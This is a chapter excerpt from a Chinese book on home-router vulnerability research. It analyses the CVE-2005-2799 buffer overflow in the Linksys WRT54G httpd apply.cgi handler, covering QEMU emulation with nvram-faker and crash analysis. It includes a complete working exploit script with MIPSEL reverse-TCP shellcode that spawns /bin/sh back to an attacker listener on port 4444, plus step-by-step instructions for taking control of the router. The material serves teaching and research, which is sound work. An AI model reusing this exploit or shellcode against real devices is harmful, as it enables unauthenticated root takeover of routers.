# Linksys WRT54G 路由器溢出漏洞分析—— 运行环境修复

本文节选自《揭秘家用路由器0day漏洞挖掘技术》，吴少华主编，王炜、赵旭编著，电子工业出版社 2015年8月出版。

本章实验测试环境说明如表13-1所示。

表13-1

|  | 测试环境 | 备 注 |
| --- | --- | --- |
| 操作系统 | Binwalk 2.0 |  |
| 文件系统提取工具 | Ubuntu 12.04 |  |
| 调试器 | IDA 6.1 |  |
| 利用代码解释器 | Python 2.7 |  |

13.1　漏洞介绍
=========

* * *

Linksys WRT54G是一款SOHO无线路由器，在功能、稳定性、双天线信号覆盖能力方面都得到了用户的认可。它还支持第三方固件，从而使其功能更加强大。不少用户购买Linksys WRT54G路由器就是为了刷第三方固件，使路由器具有可自由定制的功能。 Linksys WRT54G v2版本的路由器曝出过一个漏洞，CVE编号为CVE-2005-2799。在Cisco官网（[http://tools.cisco.com/security/center/viewAlert.x?alertId=9722](http://tools.cisco.com/security/center/viewAlert.x?alertId=9722)）可以获取如下图所示的信息。 从漏洞的公告中我们可以看出，该漏洞存在于WRT54G路由器Web服务器程序HTTPD的apply.cgi处理脚本中，由于对发送的POST请求没有设置足够的边界与内容长度检查，当未经认证的远程攻击者向路由器的apply.cgi页面发送内容长度大于10 000字节的POST请求时，就可以触发缓冲区溢出。这个漏洞会允许未经认证的用户在受影响的路由器上以root权限执行任意命令。 该漏洞被覆盖的缓冲区并不在堆栈中，因此，在溢出后不会导致堆栈上的数据被覆盖，而是直接覆盖到漏洞程序的 .data段，这时对漏洞的利用方式就与之前不同了。在这种情况下，控制溢出数据覆盖 .extern段中的函数调用地址，劫持系统函数调用，是上上之选。该漏洞就是使用这种利用方式，并在劫持系统函数调用之后使漏洞程序执行前面章节中编写的Reverse_tcp的Shellcode的。

![图13-1](http://drops.javaweb.org/uploads/images/b109ea12d268bbcb5d92b7e726179250d50794bc.jpg)

硬件和软件分析环境说明如表13-2所示。

表13-2

|  | 描述 | 备 注 |
| --- | --- | --- |
| 型号 | WRT54G | Linksys |
| 硬件版本 | V2.2 |  |
| 固件版本 | V4.00.7 |  |
| 指令系统 | MIPSEL | 小端机格式 |
| QEMU | 1.7.90 | 处理器模拟软件 |

13.2　漏洞分析
=========

* * *

下面详细分析一下这个漏洞产生的原因和利用方法。

13.2.1　固件分析
-----------

* * *

下载Linksys WRT54G路由器4.00.7版本的固件，下载链接为[http://download.pchome.net/ driver/network/route/wireless/down-129948-2.html](http://download.pchome.net/%20driver/network/route/wireless/down-129948-2.html)，解压缩后得到固件WRT54GV3.1_4.00.7_US_ code.bin。 使用Binwalk将固件中的文件系统提取出来，如下图所示。

![图13-2>](http://drops.javaweb.org/uploads/images/efe6339e255cd5190b6b12f456c54c51d5589f35.jpg)

该漏洞的核心组件为 /usr/sbin/httpd，如下图所示。

![图13-3](http://drops.javaweb.org/uploads/images/6d8e0264f35160559a5ec19af8be03106ab01290.jpg)

13.2.2　修复运行环境
-------------

* * *

从漏洞公告中我们已经知道，当路由器HTTPD的apply.cgi处理脚本接收长度大于10 000字节的POST请求时会触发缓冲区溢出漏洞。该漏洞的测试POC如下。 源码　wrt54g_test.py

```
1 import sys
2 import urllib2 
3 try:
4     target = sys.argv[1]
5 except:
6     print "Usage: %s <target>" % sys.argv[0]
7     sys.exit(1) 
8 url = "http://%s/apply.cgi" % target
9 buf  = "\x42"*10000+"\x41"*0x4000      # POST parameter name 
10 req = urllib2.Request(url, buf)
11 print urllib2.urlopen(req).read()

```

*   第8行：访问存在漏洞的apply.cgi处理脚本。
*   第9行：构造超过10 000字节的数据（这里我们构造一段足够长的数据）。

当我们使用模拟器（QEMU）运行路由器中的应用程序（如这里的Web服务器）时，经常会遇到一个问题——模拟器缺乏硬件的模拟，导致程序无法执行。而需要执行的Web服务器就是应用程序试图采用NVRAM中的信息来配置参数，但由于找不到设备导致了错误的发生。在路由器中，常见的NVRAM动态库libnvram.so提供了`nvram_get()` 函数和`nvram_set()`函数来获取和设置配置参数。如果使用模拟器运行应用程序，会在调用`nvram_get()` 函数时失败，导致应用程序无法运行（因为模拟器中没有NVRAM）。使用如下命令运行HTTPD，如下图所示。

```
$ cp $(which qemu-mipsel) ./
$ chroot ./ ./qemu-mipsel ./usr/sbin/httpd
$ netstat -an|grep 80

```

![图13-4](http://drops.javaweb.org/uploads/images/291f083005b202012dda01da7486c5d650bcb5a4.jpg)

在运行的过程中可以看到，程序报错，提示找不到 /dev/nvram文件或目录，且使用netstat命令查看当前系统开放的端口时没有发现80端口，Web服务器启动失败。

### 1．修复NVRAM

* * *

使用zcutlip的一个nvram-faker来修复NVRAM。nvram-faker虽然是一个简单的动态库，但可以使用LD_PRELOAD劫持libnvram库中的函数调用。我们只需要向一个ini的配置文件中写入合理的NVRAM配置，就可以使Web服务器程序运行。 nvram-faker的下载方法如下。

```
$ git clone https://github.com/zcutlip/nvram-faker.git
$ ls
arch.mk         contrib      nvram-faker.c           nvram.ini
buildmipsel.sh  LICENSE.txt  nvram-faker.h           README.md
buildmips.sh    Makefile     nvram-faker-internal.h

```

在nvram-faker中提供了劫持nvram_get() 函数的方法。为了让程序运行，还需要劫持一个函数，函数声明如下。

```
char *get_mac_from_ip(const char*ip);

```

为了方便使用IDA或者GDB调试，我们把fork() 函数一并劫持，否则fork() 函数产生的多进程会让调试过程异常复杂，函数声明如下。

```
int fork(void);

综上所述，我们需要对nvram-faker进行以下修改。
01　打开nvram-faker.c，添加如下代码。

1 int fork(void)
2 {
3 return 0;
4 }
5 char *get_mac_from_ip(const char*ip)
6 {
7 char mac[]="00:50:56:C0:00:08";
8 char *rmac = strdup(mac);
9 return rmac;
10 }


代码添加后如图13-5所示。
02　修改nvram-faker.h头文件，添加函数声明如下。

char *get_mac_from_ip(const char*ip);
int fork(void);

修改后如下图所示。
03　保存所有文件，进入编译环节。在 /nvram-faker目录下有两个Shell脚本：一个是buildmips.sh，即用于编译大端机格式的动态库；另一个是buildmipsel.sh，即用于编译小端机格式的动态库。WRT54G路由器是小端机格式，所以这里使用buildmipsel.sh进行编译，命令如下。

embeded@ubuntu:~/nvram-faker/ $ sh buildmipsel.sh
embeded@ubuntu:~/nvram-faker/ $ ls
arch.mk         ini.o              nvram-faker.c           nvram.ini
buildmipsel.sh  libnvram-faker.so  nvram-faker.h           README.md
buildmips.sh    LICENSE.txt        nvram-faker-internal.h
contrib         Makefile           nvram-faker.o

```

![图13-5](http://drops.javaweb.org/uploads/images/3b2668479ae1715297acbc6950c8ab4307bbfa91.jpg)

![图13-6](http://drops.javaweb.org/uploads/images/5ea9de70e3bac0e533cae2f7bca6fbed79b9f8e8.jpg)

编译好以后，会在 /nvram-faker目录下生成一个名为“libnvram-faker.so”的动态库。将libnvram-faker.so和同目录下的nvram.ini复制到WRT54G路由器的根文件系统中，示例如下。

```
embeded@ubuntu:~/nvram-faker/ $ cp libnvram-faker.so ../ _WRT54GV3.1_4.00.7_US_code.bin.extracted/squashfs-root/
embeded@ubuntu:~/nvram-faker/ $ cp nvram.ini ../_WRT54GV3.1_4.00.7_US_code.bin.extracted/squashfs-root/
embeded@ubuntu:~/_WRT54GV3.1_4.00.7_US_code.bin.extracted/squashfs-root/ $ ls
bin  etc  libnvram-faker.so  nvram.ini  sbin  usr  www
dev  lib  mnt                proc       tmp   var

```

由于libnvram-faker.so使用了共享库编译，所以我们需要将mipsel-linux-gcc交叉编译环境中lib库下的libgcc_s.so.1复制到WRT54G路由器的根文件系统中，命令如下。

```
$ cp /opt/mipsel/output/target/lib/libgcc_s.so.1 ~/_WRT54GV3.1_4.00.7_US_code.bin.extracted/squashfs-root/lib

```

### 2．修复HTTPD执行环境

* * *

HTTPD在运行时需要对 /var目录下的某些文件进行操作，而这些文件是在Linux启动过程中才会产生的，因此，编写如下prepare.sh脚本修改HTTPD执行环境。 源码　prepare.sh

```
1 rm var
2 mkdir var
3 mkdir ./var/run
4 mkdir ./var/tmp
5 touch ./var/run/lock
6 touch ./var/run/crod.pid
7 touch httpd.pid

```

脚本run_cgi.sh提供了两种方法执行HTTPD，一种是不需要调试器介入直接运行程序的执行模式，另一种是开放1234调试接口等待调试器连接。在QEMU环境中模拟执行HTTPD时，使用LD_PRELOAD环境变量加载libnvram-faker.so劫持函数调用，修复因硬件缺失导致的运行错误。增加的HTTPD脚本文件内容如下。 源码　run_cgi.sh

```
1 #!/bin/bash
2 DEBUG="$1"
3 LEN=$(echo  "$DEBUG" | wc -c)
4 # usage: sh run_cgi.sh debug   #debug mode
5 #       sh run_cgi.sh         #execute mode
6 cp $(which qemu-mipsel) ./
7 if [ "$LEN" -eq 1 ]
8 then
9         echo "EXECUTE MODE !\n"
10         sudo chroot ./ ./qemu-mipsel -E LD_PRELOAD="/libnvram-faker.so" ./usr/sbin/httpd
11 else
12         echo "DEBUG MODE !\n"
13         sudo chroot ./ ./qemu-mipsel -E LD_PRELOAD="/libnvram-faker.so" -g 1234 ./usr/sbin/httpd
14 rm qemu-mipsel
15 fi

```

### 3．测试和分析环境

* * *

测试和分析环境说明如表13-3所示。

|  | IP地址 |
| --- | --- |
| 测试主机（Windows实体机） | 192.168.90.11 |
| 虚拟主机（VMware Ubuntu） | 192.168.230.136 |
| 虚拟网管（VMware） | 192.168.230.1 |

网络拓扑如下图所示。

[![](http://static.wooyun.org//drops/20150804/2015080402371118444.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/%E5%9B%BE13-7.png)

13.2.3　漏洞成因分析
-------------

运行prepare.sh脚本，修复HTTPD执行环境，命令如下。

```
$ sh prepare.sh

```

使用run_cgi.sh脚本调试模式执行HTTPD，等待调试器连接，命令如下。

```
$ sh run_cgi.sh debug
DEBUG MODE !

```

使用IDA加载HTTPD，进行远程附加调试，按“F5”键直接运行HTTPD。待HTTPD服务开启后，在Windows下运行测试脚本wrt54g-test.py，命令如下。

```
E:\>wrt54g_test.py 192.168.230.136

```

可以看到，Ubuntu中的HTTPD程序已经崩溃了，现场如图13-8所示。阅读崩溃部分的代码，发现程序希望将0写入0x41419851（0x41414141+0x5710）处时造成错误。其原因是：系统寻不到0x41419851这块内存，而0x41414141是我们发送的伪造数据，0x5710正好是伪造的POST参数的总长度。同时，我们从崩溃现场还能知道，如果存在地址0x41414141+0x5710，那么0x004112D0处会将地址0x41414141写入寄存器 $t9，并且在0x00411208处控制程序执行流程。这里的溢出数据已经把 .extern段的strlen函数地址覆盖了。

[![](http://static.wooyun.org//drops/20150804/2015080402371117677.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/%E5%9B%BE13-8.png)

从汇编代码中可以看到，崩溃现场在do_apply_post函数的代码段中。从命名上可以知道，该函数的功能是处理apply的POST参数，正与漏洞公告中描述的一样。 下面，我们看一下崩溃现场附近的代码，分析造成漏洞的真正原因，如下图所示。

[![](http://static.wooyun.org//drops/20150804/2015080402371111843.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/%E5%9B%BE13-9.png)

在do_apply_post函数偏移0x3C处的伪代码如下。

```
1 wreadlen = wfread(post_buf,1,content-length,fhandle);
2 if(wreadlen)
3     strlen(post_buf);

```

读取长度为content-length的所有POST数据到post_buf，如果读取的POST数据长度不为0，就计算post_buf中数据的长度。 这里的content-length是POST参数的长度，在调用do_apply_post函数时并没有进行校验，而该长度在使用读取数据进入内存时也没有进行校验就直接读取了POST参数，因此导致了缓冲区溢出。 我们再看看产生缓冲区溢出的内存post_buf的位置。可以看到，post_buf位于HTTPD的 .data段中，如下图所示。在应用程序中，.data段用于存放已初始化的全局变量，这里的post_buf大小为0x2710字节（10 000字节）。

[![](http://static.wooyun.org//drops/20150804/2015080402371184686.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/%E5%9B%BE13-10.png)

现在我们已经弄清楚了漏洞的原理。该漏洞在接收超过10 000字节的来自攻击者伪造的数据包时，由于在do_apply_post函数调用前后没有验证POST数据的长度，而在do_apply_post函数中使用了自定义的wfread() 函数，并调用了fread() 系统函数，直接将伪造的超长POST数据全部复制到大小为10 000字节的全局变量post_buf中，所以导致了缓冲区溢出。

13.3　漏洞利用
=========

* * *

下面介绍一下该漏洞的利用方式。

13.3.1　漏洞利用方式：执行Shellcode
-------------------------

* * *

在漏洞分析中我们发现，该漏洞有一个特征，就是缓冲区溢出的数据覆盖 .data段中的全局变量。仔细分析能够发现在 .data段后面有以下段，如下图所示。

[![](http://static.wooyun.org//drops/20150804/2015080402371172492.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/%E5%9B%BE13-11.png)

因为这些段是连续的并且可写入，所以我们考虑通过do_apply_post函数的漏洞使溢出数据连续覆盖 .data后面的多个段，直到将 .extern段中的strlen函数地址覆盖，这样，我们就可以在wfread函数覆盖内存以后，在调用strlen函数时将执行流程劫持并执行任意地址的代码，如下图所示。

[![](http://static.wooyun.org//drops/20150804/2015080402371291123.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/%E5%9B%BE13-12.png)

在这里，只要填充0x2F32（0x1000D7A0 - 0x10001AD8）字节的数据，就可以将原来的strlen调用位置填充为任意地址，并控制执行流程。但是，为了利用的稳定性和通用性，这里选择将strlen之后的一段数据一并覆盖，利用方法如下图所示。 在post_buf中填充NOP指令及Shellcode，将post_buf之后总共0x4000字节的数据全部覆盖为post_buf首地址，使布置的缓冲区总是能够覆盖strlen函数地址，strlen指向post_buf，如此一来，原来执行strlen的地方都会跳转到post_buf首地址去执行。这样就可以保证wfread() 函数布置完缓冲区以后，在0x004112D8处执行strlen函数时会被劫持到post_buf头部去执行我们的Shellcode了。

[![](http://static.wooyun.org//drops/20150804/2015080402371299867.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/%E5%9B%BE13-13.png)

13.3.2　生成POC
------------

* * *

在完成了ROP的构造以后，编写如下代码与路由器进行交互，实现漏洞利用。 源码　wrt54g_POC.py

```
1 import sys
2 import struct,socket
3 import urllib2
4 def makepayload(host,port):
5     print '[*] prepare shellcode',
6     hosts = struct.unpack('<cccc',struct.pack('<L',host))
7     ports = struct.unpack('<cccc',struct.pack('<L',port))
8     mipselshell ="\xfa\xff\x0f\x24"   # li t7,-6
9     mipselshell+="\x27\x78\xe0\x01"   # nor t7,t7,zero
10     mipselshell+="\xfd\xff\xe4\x21"   # addi a0,t7,-3
11     mipselshell+="\xfd\xff\xe5\x21"   # addi a1,t7,-3
12     mipselshell+="\xff\xff\x06\x28"   # slti a2,zero,-1
13     mipselshell+="\x57\x10\x02\x24"   # li v0,4183 # sys_socket
14     mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
15     mipselshell+="\xff\xff\xa2\xaf"   # sw v0,-1(sp)
16     mipselshell+="\xff\xff\xa4\x8f"   # lw a0,-1(sp)
17     mipselshell+="\xfd\xff\x0f\x34"   # li t7,0xfffd
18     mipselshell+="\x27\x78\xe0\x01"   # nor t7,t7,zero
19     mipselshell+="\xe2\xff\xaf\xaf"   # sw t7,-30(sp)
20     mipselshell+=struct.pack('<2c',ports[1],ports[0]) + "\x0e\x3c"   # lui t6,0x1f90
21     mipselshell+=struct.pack('<2c',ports[1],ports[0]) + "\xce\x35"   # ori t6,t6,0x1f90
22     mipselshell+="\xe4\xff\xae\xaf"   # sw t6,-28(sp)
23     mipselshell+=struct.pack('<2c',hosts[1],hosts[0]) + "\x0e\x3c"   # lui t6,0x7f01
24     mipselshell+=struct.pack('<2c',hosts[3],hosts[2]) + "\xce\x35"   # ori t6,t6,0x101
25     mipselshell+="\xe6\xff\xae\xaf"   # sw t6,-26(sp)
26     mipselshell+="\xe2\xff\xa5\x27"   # addiu a1,sp,-30
27     mipselshell+="\xef\xff\x0c\x24"   # li t4,-17
28     mipselshell+="\x27\x30\x80\x01"   # nor a2,t4,zero
29     mipselshell+="\x4a\x10\x02\x24"   # li v0,4170  # sys_connect
30     mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
31     mipselshell+="\xfd\xff\x11\x24"   # li s1,-3
32     mipselshell+="\x27\x88\x20\x02"   # nor s1,s1,zero
33     mipselshell+="\xff\xff\xa4\x8f"   # lw a0,-1(sp)
34     mipselshell+="\x21\x28\x20\x02"   # move a1,s1 # dup2_loop
35     mipselshell+="\xdf\x0f\x02\x24"   # li v0,4063 # sys_dup2
36     mipselshell+="\x0c\x01\x01\x01"   # syscall 0x40404
37     mipselshell+="\xff\xff\x10\x24"   # li s0,-1
38     mipselshell+="\xff\xff\x31\x22"   # addi s1,s1,-1
39     mipselshell+="\xfa\xff\x30\x16"   # bne s1,s0,68 <dup2_loop>
40     mipselshell+="\xff\xff\x06\x28"   # slti a2,zero,-1
41     mipselshell+="\x62\x69\x0f\x3c"   # lui t7,0x2f2f "bi"
42     mipselshell+="\x2f\x2f\xef\x35"   # ori t7,t7,0x6269 "//"
43     mipselshell+="\xec\xff\xaf\xaf"   # sw t7,-20(sp)
44     mipselshell+="\x73\x68\x0e\x3c"   # lui t6,0x6e2f "sh"
45     mipselshell+="\x6e\x2f\xce\x35"   # ori t6,t6,0x7368 "n/"
46     mipselshell+="\xf0\xff\xae\xaf"   # sw t6,-16(sp)
47     mipselshell+="\xf4\xff\xa0\xaf"   # sw zero,-12(sp)
48     mipselshell+="\xec\xff\xa4\x27"   # addiu a0,sp,-20
49     mipselshell+="\xf8\xff\xa4\xaf"   # sw a0,-8(sp)
50     mipselshell+="\xfc\xff\xa0\xaf"   # sw zero,-4(sp)
51     mipselshell+="\xf8\xff\xa5\x27"   # addiu a1,sp,-8
52     mipselshell+="\xab\x0f\x02\x24"   # li v0,4011 # sys_execve
53     mipselshell+="\x0c\x01\x01\x01"  # syscall 0x40404
54     print 'ending ...'
55     return mipselshell 
56 try:
57     target = sys.argv[1]
58 except:
59     print "Usage: %s <target>" % sys.argv[0]
60     sys.exit(1) 
61 url = "http://%s/apply.cgi" % target
62 #ip='192.168.230.136'
63 sip='192.168.1.100'     #reverse_tcp local_ip
64 sport = 4444            #reverse_tcp local_port
65 DataSegSize = 0x4000
66 host=socket.ntohl(struct.unpack('<I',socket.inet_aton(sip))[0])
67 payload = makepayload(host,sport)
68 addr = struct.pack("<L",0x10001AD8)
69 DataSegSize = 0x4000
70 buf = "\x00"*(10000-len(payload))+payload+addr*(DataSegSize/4) 
71 req = urllib2.Request(url, buf)
72 print urllib2.urlopen(req).read()

```

*   第61行：访问存在漏洞的apply.cgi。
*   第67行：使用makepayload() 函数配置reverse_tcp的源IP地址和源PORT（端口）。
*   第70行：构造缓冲区。
*   第71行～第72行：使用HTTP协议发送伪造数据包。

13.4　漏洞测试
=========

* * *

#### 测试环境

```
01　打开网页，访问网关（路由器）。网关是192.168.1.1，浏览器访问192.168.1.1，登录WRT54G路由器，在首页上可以看到当前路由器的型号和固件版本。
02　使用nc命令在192.168.1.100上打开4444端口监听，命令为“nc -lp 4444”。
03　执行测试脚本，命令为“wrt54g_POC.py 192.168.1.1”。
04　执行任意命令。

```

整个过程如下图所示。

[![](http://static.wooyun.org//drops/20150804/2015080402371217159.png)](http://drops.wooyun.org/wp-content/uploads/2015/08/%E5%9B%BE13-14.png)

登录路由器以后，就可以使用命令对路由器进行控制，并查看路由器CPU的信息了。